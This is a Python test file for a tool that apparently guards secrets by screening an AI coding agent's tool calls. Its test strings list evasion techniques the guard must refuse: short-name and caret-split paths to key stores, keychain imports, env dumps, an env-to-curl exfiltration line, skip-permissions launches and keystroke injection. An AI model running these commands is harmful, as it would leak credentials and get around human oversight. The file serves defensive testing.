"""Security panel, round 4, builder A: the hook, proxy, policy, logfacts, panic.

1 Windows 8.3 short names           2 inline Python that loads stuntkey's code
3 caret / quote splitting           4 MCP path arguments
5 claude started with other settings   6 env dumps, audit reset, --yes, SendKeys, panic text
7 big content searches              8 Read / Grep / notebook output shapes
9 matcher, timeout, install text    11 logfacts (no import cycle)
12 secret-name parts                13 env | grep ^PATH
14 proxy NameError, residual secret 15 GraphQL linear

Everything is synthetic: fake keys, a throwaway HOME, the in-memory keychain.
"""
import argparse
import contextlib
import io
import json
import os
import re
import sys
import time
import unittest
from unittest import mock

import _isolation  # noqa: F401
from stuntkey import doctor, hook as hook_mod, keychain, logfacts, panic, policy, scrub

REPO = _isolation.REPO
K = "zq9Xr4Lm2Vt8Kp3Wn7Yb5Qd6Hs1JfAbCdEfGhIj"            # no known key format, not an example


def _memory_keychain(case):
    os.environ["STUNTKEY_KEYCHAIN"] = "memory"
    keychain._memory.clear()
    case.addCleanup(keychain._memory.clear)
    case.addCleanup(lambda: os.environ.pop("STUNTKEY_KEYCHAIN", None))

    def rm():
        folder = os.path.dirname(scrub.fingerprint_path())
        for name in ("fingerprints.json", "integrity-fingerprint.key", "audit.log", "audit.log.head"):
            try:
                os.unlink(os.path.join(folder, name))
            except OSError:
                pass
    case.addCleanup(rm)


def pre(tool, **tool_input):
    status, out = hook_mod.check(json.dumps({"hook_event_name": "PreToolUse", "tool_name": tool,
                                             "tool_input": tool_input}))
    assert status == 0
    return json.loads(out)["hookSpecificOutput"] if out else None


def bash(cmd, tool="Bash"):
    return pre(tool, command=cmd)


def post(tool, resp, **kw):
    status, out = hook_mod.check(json.dumps({"hook_event_name": "PostToolUse", "tool_name": tool,
                                             "tool_response": resp, **kw}))
    assert status == 0
    return json.loads(out)["hookSpecificOutput"] if out else None


def denied(x):
    return bool(x) and x.get("permissionDecision") == "deny"


# a fake GetLongPathNameW: only these paths "exist"
LONG = {
    "C:/Users/me/STUNTK~1": "C:/Users/me/.stuntkey",
    "C:/Users/me/CLAUDE~1.JSO": "C:/Users/me/.claude.json",
    "C:/proj/ENV~1": "C:/proj/.env",
    "C:/Users/me/CLAUDE~1": "C:/Users/me/.claude",
}


def fake_long(path):
    return LONG.get(path.replace("\\", "/"))


# ============================================================ 1. 8.3 short names

class ShortNames(unittest.TestCase):
    def setUp(self):
        p = mock.patch.object(hook_mod, "_get_long_path_name", fake_long)
        p.start()
        self.addCleanup(p.stop)

    def test_the_expansion_spells_out_a_short_name_and_keeps_the_rest(self):
        self.assertEqual(hook_mod.expand_short_names("C:/Users/me/STUNTK~1").replace("\\", "/"),
                         "C:/Users/me/.stuntkey")
        self.assertEqual(hook_mod.expand_short_names("C:/Users/me/STUNTK~1/keys/a.txt").replace("\\", "/"),
                         "C:/Users/me/.stuntkey/keys/a.txt")

    def test_a_path_without_a_short_name_is_untouched(self):
        self.assertEqual(hook_mod.expand_short_names("C:/proj/readme.md"), "C:/proj/readme.md")

    def test_the_matcher(self):
        rx = hook_mod._SHORT_NAME_RE
        for yes in ("STUNTK~1", "CLAUDE~1.JSO", "ENV~1", r"C:\Users\x\STUNTK~1\keys"):
            self.assertTrue(rx.search(yes), yes)
        for no in ("HEAD~1", "main~2", "plain.txt", "a~b", "toolongname~1"):
            self.assertFalse(rx.search(no), no)

    def test_read_of_a_short_named_stuntkey_folder_is_refused(self):
        self.assertTrue(denied(pre("Read", file_path="C:/Users/me/STUNTK~1/keys/a.txt")))

    def test_write_to_a_short_named_settings_file_is_refused(self):
        self.assertTrue(denied(pre("Write", file_path="C:/Users/me/CLAUDE~1.JSO", content="{}")))
        self.assertTrue(denied(pre("Edit", file_path="C:/Users/me/CLAUDE~1.JSO",
                                   old_string="a", new_string="b")))

    def test_read_of_a_short_named_env_file_is_refused(self):
        self.assertTrue(denied(pre("Read", file_path="C:/proj/ENV~1")))
        self.assertTrue(denied(pre("Grep", pattern="x", path="C:/proj/ENV~1")))

    def test_the_hook_does_not_refuse_an_ordinary_short_looking_path(self):
        self.assertFalse(denied(pre("Read", file_path="C:/proj/readme.md")))

    def test_a_shell_command_naming_a_short_twin_is_refused_on_windows(self):
        with mock.patch.object(hook_mod, "_ON_WINDOWS", True):
            for cmd in (r"type C:\Users\me\STUNTK~1\keys\x", r"type %USERPROFILE%\CLAUDE~1.JSO",
                        r"cat ~/STUNTK~1/keys/x", r"copy C:\proj\ENV~1 x.txt"):
                self.assertTrue(denied(bash(cmd)), cmd)

    def test_git_revisions_and_the_profile_folders_own_short_name_stay_allowed(self):
        with mock.patch.object(hook_mod, "_ON_WINDOWS", True):
            for cmd in (r"cd C:\proj && git diff HEAD~1", r"dir C:\Users\DANIE~1\AppData\Local\Temp",
                        "git log main~3"):
                self.assertFalse(denied(bash(cmd)), cmd)

    def test_not_applied_off_windows(self):
        with mock.patch.object(hook_mod, "_ON_WINDOWS", False):
            self.assertIsNone(hook_mod.short_names_in_command(r"type C:\Users\me\STUNTK~1\x"))


# ============================================================ 2. inline Python

class InlinePython(unittest.TestCase):
    DENY = (
        'python -c "from stuntkey import approve, keychain"',
        'python -c "from stuntkey import (approve,\n keychain)"',
        'python -c "import stuntkey.approve, stuntkey.keychain as k"',
        'python -c "import stuntkey; k=stuntkey.keychain; print(k)"',
        'python -c "from stuntkey import *"',
        'python -c "import runpy; runpy.run_module(\'stuntkey.store\')"',
        'python -m stuntkey.store',
        'python -m stuntkey.scrub',
        'python - <<EOF\nfrom stuntkey import approve, keychain\nEOF',
        'echo "import stuntkey.broker" | python',
        'py -3 -c "import oathkey.keychain"',
    )

    def test_each_form_is_refused(self):
        for cmd in self.DENY:
            self.assertTrue(denied(bash(cmd)), cmd)
            self.assertTrue(denied(bash(cmd, "PowerShell")), cmd)

    def test_the_command_line_and_plain_python_stay_allowed(self):
        for cmd in ('python -c "print(1)"', "python -m stuntkey doctor", "python -m stuntkey.cli status",
                    'python -c "import stuntkey; print(stuntkey.__version__)"',
                    "python -m unittest tests.test_x", "stuntkey status"):
            self.assertFalse(denied(bash(cmd)), cmd)


# ============================================================ 3. caret / quote splitting

class SplitNames(unittest.TestCase):
    def test_caret_and_quote_splits_of_the_store_name(self):
        for cmd in (r"type C:\Users\me\.stu^ntkey\keys\x", r"type C:\Users\me\.stu'nt'key\keys\x",
                    r'type C:\Users\me\.stu""ntkey\keys\x', r"cat %USERPROFILE%\.stu^ntkey\x",
                    r"cat C:\Users\me\.oath^key\x"):
            self.assertTrue(denied(bash(cmd)), cmd)

    def test_split_env_and_claude_names(self):
        self.assertTrue(denied(bash(r"type C:\proj\.e^nv")))
        self.assertTrue(denied(bash(r"copy x C:\Users\me\.cla^ude.json")))

    def test_plain_commands_still_pass(self):
        self.assertFalse(denied(bash(r"type C:\proj\readme.md")))


# ============================================================ 4. MCP path arguments

class McpPaths(unittest.TestCase):
    def test_a_path_like_argument_goes_through_the_file_rules(self):
        T = "mcp__files__read_file"
        for args in ({"path": "C:/proj/.env"}, {"file": "~/.stuntkey/keys/x"},
                     {"uri": "file:///C:/Users/me/.stuntkey/keys/x"},
                     {"source": "C:/Users/me/.claude/settings.json"},
                     {"filepath": "C:/proj/prod.env"},
                     {"options": {"directory": "/home/me/.ssh"}},
                     {"items": [{"url": "file:///home/me/.claude.json"}]},
                     {"anything": "C:/Users/me/.stuntkey/x"}, {"x": "~/.env.local"}):
            self.assertTrue(denied(pre(T, **args)), args)

    def test_a_short_name_in_a_path_argument(self):
        with mock.patch.object(hook_mod, "_get_long_path_name", fake_long):
            self.assertTrue(denied(pre("mcp__files__read", directory="C:/Users/me/STUNTK~1")))

    def test_plain_data_stays_allowed(self):
        T = "mcp__memory__add_note"
        for args in ({"note": "remember the .env file is secret"}, {"path": "C:/proj/readme.md"},
                     {"query": "shoes"}, {"url": "https://example.com/a.env"},
                     {"text": "run stuntkey run", "tags": ["a", "b"]}):
            self.assertFalse(denied(pre(T, **args)), args)


# ============================================================ 5. claude started with other settings

class ClaudeInvocations(unittest.TestCase):
    def test_refused(self):
        for cmd in ("claude --dangerously-skip-permissions -p hi", "claude --settings x.json -p hi",
                    "claude.exe --setting-sources project", "claude mcp add evil -- cmd",
                    r"CLAUDE_CONFIG_DIR=C:\x claude -p hi", '$env:CLAUDE_CONFIG_DIR = "x"; claude',
                    "set CLAUDE_CONFIG_DIR=C:\\x && claude", "echo a && sudo claude --settings s",
                    "env CLAUDE_CONFIG_DIR=/x claude -p hi", "/usr/local/bin/claude --settings s"):
            self.assertTrue(denied(bash(cmd)), cmd)

    def test_ordinary_use_stays_allowed(self):
        for cmd in ("claude --version", 'claude -p "summarise"', "claude mcp list"):
            self.assertFalse(denied(bash(cmd)), cmd)


# ============================================================ 6. the low-severity list

class SmallRules(unittest.TestCase):
    def test_more_env_dump_forms(self):
        for cmd in ("/usr/bin/env", "env -u X env", "busybox env", "echo a && sudo env", "sudo -E env",
                    "FOO=1 env", "x; /bin/env | sort", "env -i /usr/bin/env"):
            self.assertTrue(denied(bash(cmd)), cmd)
        for cmd in ("python -m venv env", "env FOO=1 ls", "printenv PATH", "cd env", "ls env",
                    "source env/bin/activate"):
            self.assertFalse(denied(bash(cmd)), cmd)

    def test_python_and_node_environment_dumps(self):
        for cmd in ('python -c "from os import environ as e; print(e)"',
                    'python -c "import os; print(os.environ._data)"',
                    'python -c "import os; print(os.environb)"',
                    "node -e \"console.log({...process.env})\"",
                    'python -c "from os import environ as e\nfor k, v in e.items(): print(k)"'):
            self.assertTrue(denied(bash(cmd)), cmd)
        self.assertFalse(denied(bash('python -c "from os import environ as e; print(e[\'PATH\'])"')))

    def test_only_the_person_runs_audit_reset_and_the_yes_forms(self):
        for cmd in ("stuntkey audit reset", "python -m stuntkey audit reset", "stuntkey setup --yes",
                    "stuntkey install --yes", "stuntkey fix --yes", "stuntkey wrap npm --yes",
                    "stuntkey hook install -y", "stuntkey.exe fix -y"):
            self.assertTrue(denied(bash(cmd)), cmd)
        for cmd in ("stuntkey status", "stuntkey fix", "stuntkey audit verify", "stuntkey doctor"):
            self.assertFalse(denied(bash(cmd)), cmd)

    def test_typing_into_other_windows_is_refused(self):
        for cmd in ("powershell -c \"(New-Object -ComObject WScript.Shell).SendKeys('y')\"",
                    "python -c \"import pyautogui; pyautogui.press('y')\"",
                    "[void][Microsoft.VisualBasic.Interaction]::AppActivate('x')"):
            self.assertTrue(denied(bash(cmd)), cmd)

    def test_panic_says_the_keychain_was_locked_not_that_no_key_exists(self):
        import test_panic
        tmp = _isolation.mktemp()
        out = io.StringIO()

        def locked(_recipe):
            raise keychain.KeychainError("the vault did not answer")
        code = panic.cmd_panic(test_panic.args("github", dry=True), test_panic.CATALOG, connect_fn=None,
                               env_file=os.path.join(tmp, ".env"), root=tmp, out=out, read_values=locked,
                               home=tmp, git=lambda root, matcher: {"findings": []})
        text = out.getvalue()
        self.assertEqual(code, 0)
        self.assertIn("locked", text)
        self.assertIn("revoke by hand", text)
        self.assertNotIn("no stored key found", text)

    def test_panic_with_nothing_stored_still_says_so(self):
        import test_panic
        tmp = _isolation.mktemp()
        out = io.StringIO()
        panic.cmd_panic(test_panic.args("github", dry=True), test_panic.CATALOG, connect_fn=None,
                        env_file=os.path.join(tmp, ".env"), root=tmp, out=out, read_values=lambda r: {},
                        home=tmp, git=lambda root, matcher: {"findings": []})
        self.assertIn("no stored key found", out.getvalue())


class PostCheckDepthAndKeys(unittest.TestCase):
    def setUp(self):
        _memory_keychain(self)
        scrub.remember_key("svc/API_KEY", K)

    def test_output_nested_too_deeply_to_check_is_withheld(self):
        deep = {"a": K}
        for _ in range(hook_mod.MAX_DEPTH + 5):
            deep = {"n": deep}
        out = post("mcp__x__y", {"content": deep})
        self.assertIsNotNone(out)
        self.assertNotIn(K, json.dumps(out))
        self.assertIn("withheld", json.dumps(out))

    def test_a_key_used_as_a_dict_key_in_an_mcp_result_is_masked(self):
        out = post("mcp__x__y", {"content": [{K: 1, "ok": "fine"}]})
        self.assertIsNotNone(out)
        self.assertNotIn(K, json.dumps(out))
        self.assertIn("fine", json.dumps(out))

    def test_residual_secret_after_masking_withholds_the_whole_text(self):
        # the masking step "misses" the key; the disguise check still finds it
        with mock.patch.object(scrub, "mask_secrets", lambda *a, **k: (a[0], 0)), \
                mock.patch.object(scrub, "loosely_contains", lambda *a, **k: True):
            new, n = hook_mod._mask_text("hello there", (b"", frozenset()), [b"x"], time.monotonic() + 5)
        self.assertEqual(new, scrub.WITHHELD_NOTICE)
        self.assertEqual(n, 1)

    def test_no_residual_means_the_text_is_kept(self):
        with mock.patch.object(scrub, "mask_secrets", lambda *a, **k: (a[0], 0)), \
                mock.patch.object(scrub, "loosely_contains", lambda *a, **k: False):
            new, n = hook_mod._mask_text("hello there", (b"", frozenset()), [b"x"], time.monotonic() + 5)
        self.assertEqual((new, n), ("hello there", 0))


# ============================================================ 7. big content searches

class BigContentSearch(unittest.TestCase):
    def setUp(self):
        _memory_keychain(self)
        scrub.remember_key("svc/API_KEY", K)
        self.root = _isolation.mktemp()

    def _folder(self, name, n=6):
        d = os.path.join(self.root, name)
        os.makedirs(d)
        for i in range(n):
            with open(os.path.join(d, f"f{i}.txt"), "w", encoding="utf-8") as f:
                f.write("nothing here\n")
        return d

    def test_too_many_files_in_a_place_that_holds_keys_is_refused(self):
        d = self._folder("my_secrets")
        with mock.patch.object(hook_mod, "PROBE_SCAN_FILES", 3):
            why = hook_mod._probe_hit(d, time.monotonic() + 5, strict=False)
        self.assertIn("too many files", why or "")

    def test_out_of_time_in_a_place_that_holds_keys_is_refused(self):
        d = self._folder("my_secrets", 2)
        why = hook_mod._probe_hit(d, time.monotonic() - 1, strict=False)
        self.assertIn("out of time", why or "")

    def test_an_ordinary_project_folder_is_let_through_with_an_audit_line(self):
        d = self._folder("proj")
        with mock.patch.object(hook_mod, "_TEMP_PATH_RE", re.compile(r"(?!x)x")), \
                mock.patch.object(hook_mod, "PROBE_SCAN_FILES", 3), \
                mock.patch.object(hook_mod, "_audit_marker") as audit:
            why = hook_mod._probe_hit(d, time.monotonic() + 5, strict=False)
        self.assertIsNone(why)
        audit.assert_called_once()
        self.assertEqual(audit.call_args[0][0], logfacts.PROBE_SKIPPED)

    def test_home_and_drive_roots_count_as_key_places(self):
        self.assertTrue(hook_mod._key_location(os.path.expanduser("~")))
        self.assertTrue(hook_mod._key_location(os.path.abspath(os.sep)))

    def test_a_grep_that_prints_lines_there_is_refused(self):
        d = self._folder("my_secrets")
        with mock.patch.object(hook_mod, "PROBE_SCAN_FILES", 3):
            out = pre("Grep", pattern="hello", path=d, output_mode="content")
        self.assertTrue(denied(out))

    def test_a_missing_output_mode_is_still_read_as_content(self):
        d = self._folder("my_secrets")
        with mock.patch.object(hook_mod, "PROBE_SCAN_FILES", 3):
            self.assertTrue(denied(pre("Grep", pattern="hello", path=d)))
            self.assertFalse(denied(pre("Grep", pattern="hello", path=d, output_mode="files_with_matches")))
            self.assertFalse(denied(pre("Grep", pattern="hello", path=d, output_mode="count")))


# ============================================================ 8. Read / Grep / notebook shapes

class OutputShapes(unittest.TestCase):
    def setUp(self):
        _memory_keychain(self)
        scrub.remember_key("svc/API_KEY", K)
        p = mock.patch.object(hook_mod, "_audit_marker")
        self.audit = p.start()
        self.addCleanup(p.stop)

    def words(self):
        return [c[0][0] for c in self.audit.call_args_list]

    def test_grep_without_a_mode_is_masked_as_content(self):
        new = post("Grep", {"content": "a:1:" + K, "numLines": 1})["updatedToolOutput"]
        self.assertNotIn(K, json.dumps(new))

    def test_grep_files_and_counts_are_left_alone_and_not_logged(self):
        self.assertIsNone(post("Grep", {"mode": "files_with_matches", "filenames": ["a"], "numFiles": 1}))
        self.assertIsNone(post("Grep", {"mode": "count", "numMatches": 3}))
        self.assertIsNone(post("Grep", {"filenames": ["a"], "numFiles": 1}))
        self.assertEqual(self.words(), [])

    def test_a_notebook_read_is_masked_and_keeps_its_shape(self):
        resp = {"type": "notebook", "file": {"filePath": "/p/a.ipynb", "cells": [
            {"cellType": "code", "source": "key = '" + K + "'", "outputs": [{"text": "out " + K}]},
            {"cellType": "markdown", "source": "hello"}]}}
        new = post("Read", resp)["updatedToolOutput"]
        self.assertNotIn(K, json.dumps(new))
        self.assertEqual(len(new["file"]["cells"]), 2)
        self.assertEqual(new["file"]["cells"][1]["source"], "hello")
        self.assertEqual(new["file"]["filePath"], "/p/a.ipynb")
        self.assertEqual(self.words(), [])             # a successful mask is not logged

    def test_a_clean_notebook_is_left_alone(self):
        self.assertIsNone(post("Read", {"type": "notebook", "file": {"cells": [{"source": "x = 1"}]}}))

    def test_pdf_image_and_parts_pass_with_one_unmaskable_line_and_no_shape_miss(self):
        for kind in ("pdf", "image", "parts"):
            self.audit.reset_mock()
            self.assertIsNone(post("Read", {"type": kind, "file": {"base64": "AAAA"}}))
            self.assertEqual(self.words(), [logfacts.UNMASKABLE], kind)

    def test_file_unchanged_is_untouched_and_not_logged(self):
        self.assertIsNone(post("Read", {"type": "file_unchanged", "file": {"filePath": "/p"}}))
        self.assertEqual(self.words(), [])

    def test_a_true_shape_miss_is_logged_once(self):
        self.assertIsNone(post("Read", {"type": "text", "file": {"filePath": "/p"}}))
        self.assertEqual(self.words(), [logfacts.SHAPE_UNVERIFIED])

    def test_a_successful_text_mask_is_not_logged(self):
        resp = {"type": "text", "file": {"filePath": "/p", "content": "k=" + K, "numLines": 1}}
        self.assertNotIn(K, json.dumps(post("Read", resp)))
        self.assertEqual(self.words(), [])


# ============================================================ 9. matcher, timeout, install text

class InstallText(unittest.TestCase):
    def test_the_output_matcher_is_anchored_and_lists_the_shell_and_file_tools(self):
        m = hook_mod.POST_MATCHER
        self.assertTrue(m.startswith("^") and m.endswith("$"))
        for tool in ("Bash", "PowerShell", "Read", "Grep", "mcp__a__b"):
            self.assertTrue(re.match(m, tool), tool)
        for tool in ("BashX", "xRead", "Write"):
            self.assertFalse(re.match(m, tool), tool)

    def test_the_handler_carries_an_explicit_timeout_and_blocks_on_failure(self):
        h = hook_mod.hook_handler()
        self.assertEqual(h["timeout"], 10)
        self.assertEqual(h["onFailure"], "block")
        self.assertNotIn("onFailure", hook_mod.post_entry(h)["hooks"][0])

    def test_the_install_message_no_longer_says_read_and_grep_cannot_be_changed(self):
        with open(os.path.join(REPO, "stuntkey", "hook.py"), encoding="utf-8") as f:
            src = f.read()
        self.assertNotIn("cannot be changed afterwards", src)
        self.assertIn("best effort", src)

    def test_the_docs_match_the_code(self):
        for name in ("SECURITY.md", os.path.join("docs", "THREAT_MODEL.md")):
            with open(os.path.join(REPO, name), encoding="utf-8") as f:
                text = f.read()
            self.assertIn("CLAUDE_CODE_SUBPROCESS_ENV_SCRUB", text, name)
            self.assertRegex(text, r"(?i)telemetry[^.]{0,200}original", name)
            self.assertNotRegex(text, r"(?i)Read, Grep, WebFetch and Task results cannot be changed", name)


# ============================================================ 11. logfacts

class LogFacts(unittest.TestCase):
    def test_only_the_tail_is_read_and_lines_are_parsed(self):
        d = _isolation.mktemp()
        path = os.path.join(d, "audit.log")
        line = json.dumps({"result": logfacts.SHAPE_UNVERIFIED}) + "\n"
        filler = json.dumps({"result": "ok", "pad": "x" * 900}) + "\n"
        with open(path, "w", encoding="utf-8") as f:
            f.write(line * 3)                                    # far from the end
            f.write(filler * (logfacts.TAIL_BYTES // len(filler) + 50))
            f.write("not json " + logfacts.SHAPE_UNVERIFIED + "\n")  # mentions the word, not a record
            f.write(line * 2)
        self.assertEqual(logfacts.count_results(path, logfacts.SHAPE_UNVERIFIED), 2)

    def test_a_missing_log_counts_zero(self):
        self.assertEqual(logfacts.count_results(os.path.join(_isolation.mktemp(), "none"), "x"), 0)
        self.assertEqual(logfacts.count_results(None, "x"), 0)

    def test_the_hook_reexports_the_same_words_and_counts(self):
        self.assertEqual(hook_mod.SHAPE_UNVERIFIED, logfacts.SHAPE_UNVERIFIED)
        self.assertEqual(hook_mod.POST_FAILED_RESULT, logfacts.POST_FAILED_RESULT)
        d = _isolation.mktemp()
        path = os.path.join(d, "audit.log")
        with open(path, "w", encoding="utf-8") as f:
            f.write(json.dumps({"result": logfacts.POST_FAILED_RESULT}) + "\n")
        self.assertEqual(logfacts.post_failures(path), 1)

    def test_doctor_imports_logfacts_statically_and_has_no_importlib_trick(self):
        self.assertIs(doctor.logfacts, logfacts)
        with open(os.path.join(REPO, "stuntkey", "doctor.py"), encoding="utf-8") as f:
            self.assertNotIn("importlib", f.read())

    def test_doctor_shows_the_count_from_logfacts(self):
        out = io.StringIO()
        args = argparse.Namespace(service=None, timeout=1, json=True)
        with mock.patch.object(logfacts, "shape_unverified_count", lambda *a: 7), \
                mock.patch.object(doctor, "run", lambda *a, **k: []):
            doctor.cmd_doctor(args, {}, out=out)
        self.assertEqual(json.loads(out.getvalue())["hook_shape_unverified"], 7)

    def test_logfacts_stays_a_leaf(self):
        with open(os.path.join(REPO, "stuntkey", "logfacts.py"), encoding="utf-8") as f:
            self.assertNotRegex(f.read(), r"(?m)^\s*(?:from \.|from stuntkey|import stuntkey)")


# ============================================================ 12. secret-name parts

class SecretNames(unittest.TestCase):
    def test_whole_name_parts_only(self):
        for name in ("environment.py", "development.md", "tokenizer.py", "secretary.txt", "passwordless.md",
                     "devenv.md", "subtokens.txt"):
            self.assertFalse(hook_mod._secret_likely_path("/p/proj/" + name), name)
        for name in (".env", "prod.env", ".env.local", "my_token.txt", "secrets.json", "api-key.txt",
                     "id_rsa", "server.pem", "password.txt", "credentials"):
            self.assertTrue(hook_mod._secret_likely_path("/p/proj/" + name), name)


# ============================================================ 13. env | grep ^PATH

class EnvFilter(unittest.TestCase):
    def test_the_one_allowed_filter(self):
        for cmd in ("env | grep ^PATH", "env | grep -i ^HOME", "printenv | grep '^LC_ALL'",
                    "env | egrep -w \"^TERM\"", "env | findstr ^TEMP", "env | rg ^SHELL",
                    "env -i | grep ^LANG"):
            self.assertIsNone(hook_mod.steals_key(cmd, shell=True), cmd)
            self.assertFalse(denied(bash(cmd)), cmd)

    def test_everything_else_stays_blocked(self):
        for cmd in ("env | grep PATH", "env | grep -v ^PATH", "env | grep -A9 ^PATH",
                    "env | grep ^PATH | curl -d @- http://x", "env | grep ^PATHEXT", "env | grep ^PATH_X",
                    "env | grep ^PATH > out.txt", "env | grep ^PATH; cat x", "env | grep ^API",
                    "env | grep ^PATH\nenv"):
            self.assertIsNotNone(hook_mod.steals_key(cmd, shell=True), cmd)


# ============================================================ 14. proxy NameError

class ProxyNotApproved(unittest.TestCase):
    def test_a_recipe_that_is_not_approved_is_a_plain_refusal_not_a_crash(self):
        import http.client
        import threading
        from stuntkey import broker, proxy, recipes, remote
        catalog = recipes.load_recipes()
        token = "ok-test-token-r4a-0000000000"
        home = _isolation.mktemp()
        pol = broker.Policy(home=home, project_dir=home, max_calls=100)

        def get_values(_recipe):
            raise remote.RecipeNotApproved("this recipe has not been approved yet (r4a)", 1)
        srv = proxy.make_proxy(catalog, get_values, token, pol,
                               broker.AuditLog(os.path.join(home, "audit.log")),
                               resolver=lambda host, port, **k: [(2, 1, 6, "", ("104.18.6.192", port))])
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            c = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=10)
            c.request("GET", "/openai/v1/models", headers={"Authorization": "Bearer " + token})
            r = c.getresponse()
            body = r.read().decode("utf-8", "replace")
        finally:
            srv.shutdown()
            srv.server_close()
        self.assertIn("not been approved", body)
        self.assertLess(r.status, 500)


# ============================================================ 15. GraphQL

class GraphqlLinear(unittest.TestCase):
    def test_results_unchanged(self):
        self.assertEqual(policy.gql_operations("query Q { a } mutation M { b }"), {"query", "mutation"})
        self.assertEqual(policy.gql_operations("{ a }"), {"query"})
        self.assertIsNone(policy.gql_operations("shoes"))          # a REST {"query": "shoes"}: unreadable

    def test_no_copy_of_the_rest_of_the_document_per_step(self):
        import inspect
        self.assertNotIn("s[i:]", inspect.getsource(policy.gql_operations))

    def test_many_operations_in_one_document(self):
        doc = "query Q { a } " * 3000
        t = time.monotonic()
        self.assertEqual(policy.gql_operations(doc), {"query"})
        self.assertLess(time.monotonic() - t, 2.0)


if __name__ == "__main__":
    unittest.main()
